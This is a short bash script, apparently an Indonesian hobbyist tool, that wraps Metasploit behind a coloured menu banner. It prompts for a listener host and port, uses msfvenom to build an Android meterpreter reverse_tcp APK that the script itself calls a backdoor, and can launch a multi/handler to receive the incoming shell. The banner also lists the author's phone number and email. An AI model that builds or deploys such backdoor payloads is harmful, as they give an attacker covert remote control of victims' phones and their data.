bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

intro() {
clear 
echo "Rein Xceed" | lolcat
echo
echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
echo $i" |"$cy"     TOOLS PAYLOAD METASPLOIT        "$i"         |"
echo $i" |"$me"─────────────────────────────────────────────"$i"|"
echo $i" |"$pu" AUTHOR :"$ku" Rein Xceed.            "$i"            |"
echo $i" |"$pu" FACEBOOK :"$ku" Ryan Dwi"$i"                         |"
echo $i" |"$pu" THANKS TO :"$cy"~ [tuhanygMahaEsa] "$i" |"
echo $i" |"$cy"            ~ [cyber]                       "$i" |"
echo $i" |"$pu" Contack WhatsApp :"$ku" 082321618829"$i"             |"
echo $i" |"$pu" Contack Gmail :"$ku" ryandwi276@gmail.com"$i"        |"
echo $i"["$bi"•"$i"]"$me"───────────────────────────────────────────"$i"["$bi"•"$i"]"
echo
}
meta() {
echo $me'['$bi'1'$me']'$i'Membuat Backdoor Menggunakan Metasploit'
echo $me'['$bi'X'$me']'$i'Exit'
read -p 'Input > ' play
if [ $play = '1' ]
then
sploit
fi
}

sploit() {
intro 
echo $i 'Masukan LPORT'
read -p 'Input > ' lport
echo $i 'Masukan LHOST'
read -p 'input > ' ip
echo $i 'konfirmasi LPORT'
read -p 'input > ' lport
echo $i'Buat Name BackDoor (jangan menggunakan spasi)'
read -p 'input > ' name
echo $pur 'sedang membuat backdoor' | pv -qL 9;
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$lport -o /sdcard/$name.apk
echo $cy 'berhasil membuat backdoor'
intro 
echo $i 'Apakah Ingin Menjalankan Metasploit y/n'
read -p 'input > ' jalan
if [ $jalan = 'y' ]
then
metasploit
else
intro 
exit
fi 
}

metasploit() {
echo $pur'Sedang Menjalankan Metasploit'
msfconsole -q -x "use exploit/multi/handler;
set payload android/meterpreter/reverse_tcp;
set lhost 127.0.0.1;
set lport $lport;
exploit"
}
intro
meta
